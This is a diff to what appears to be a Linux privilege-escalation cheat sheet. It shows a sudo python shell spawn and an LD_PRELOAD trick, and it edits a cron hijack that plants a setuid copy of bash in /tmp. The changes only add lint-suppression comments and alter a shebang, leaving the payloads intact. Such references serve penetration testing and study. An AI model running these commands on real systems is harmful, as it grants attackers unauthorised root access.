@@ -109,7 +109,7 @@ sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
 # sudo env with LD_PRELOAD
 # If env_keep+=LD_PRELOAD is set:
 # Compile shared object that spawns shell
-# sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/any_allowed_command
+# sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/any_allowed_command  # no-tmp: ok — target host LD_PRELOAD path
 ```
 
 ### PwnKit (CVE-2021-4034)
@@ -154,8 +154,8 @@ cat /etc/exports
 ```bash
 # If cron job uses relative paths:
 # Create malicious binary in writable PATH directory
-echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/command_name
-chmod +x /tmp/command_name
+echo '#!/usr/bin/env bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/command_name  # no-tmp: ok — payload planted on the target host
+chmod +x /tmp/command_name  # no-tmp: ok — payload planted on the target host
 # Wait for cron to execute, then:
-/tmp/rootbash -p
+/tmp/rootbash -p  # no-tmp: ok — payload planted on the target host
 ```
